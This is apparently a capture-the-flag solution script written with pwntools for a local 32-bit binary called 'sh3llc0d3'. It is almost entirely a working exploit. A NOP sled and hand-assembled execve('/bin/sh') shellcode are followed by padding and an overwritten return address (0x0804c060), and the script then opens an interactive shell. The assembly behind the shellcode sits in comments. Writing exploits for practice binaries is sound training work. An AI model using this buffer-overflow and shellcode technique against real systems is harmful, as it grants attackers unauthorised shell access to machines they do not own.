from pwn import *

context.terminal =['tmux','splitw','-h']
context.arch ='i386'
r= process("./sh3llc0d3")

#r = gdb.debug("./sh3llc0d3",'''b*0x080491c9
#                               continue
#			       b*0x080491dd
#			       finish
#			       finish ''')
#check ssh debug

#0x0804c060
#mov   esp,0x0804c060
#mov   edx,0x6e69622f
#mov   ebx,esp
#push  edx
#mov   edx,0x09798440
#sub   edx,0x09111111
#push  edx
#xor   edx,edx
#push  edx
#mov   ecx,esp
#mov   edx,esp
#xor   eax,eax
#movb  eax,0x0b
#int   0x80
test=b"\x90"*144+b"\xBC\x60\xC0\x04\x08\xBA\x2F\x62\x69\x6E\x52\x89\xE3\xBA\x40\x84\x79\x09\x81\xEA\x11\x11\x11\x09\xBC\x64\xC0\x04\x08\x52\x31\xD2\xBC\x68\xC0\x04\x08\x52\x89\xE1\x89\xE2\x31\xC0\xB0\x0B\xCD\x80"+b"\x90"*20 +b"\x60\xc0\x04\x08"+b"\x90"*784
input("press any key")
r.send(test)
r.interactive()
